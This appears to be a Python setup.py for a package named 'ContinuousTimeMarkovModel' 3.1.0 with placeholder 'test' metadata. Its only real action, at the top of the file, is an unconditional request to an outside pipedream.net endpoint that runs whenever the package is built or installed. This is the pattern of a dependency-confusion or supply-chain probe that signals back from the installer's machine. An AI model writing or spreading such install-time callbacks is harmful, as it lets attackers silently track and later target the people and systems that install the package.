from setuptools import setup
from setuptools.command.install import install
import requests

x = requests.get('https://eornotooqymntmm.m.pipedream.net')


setup(name='ContinuousTimeMarkovModel',
      version='3.1.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False
)

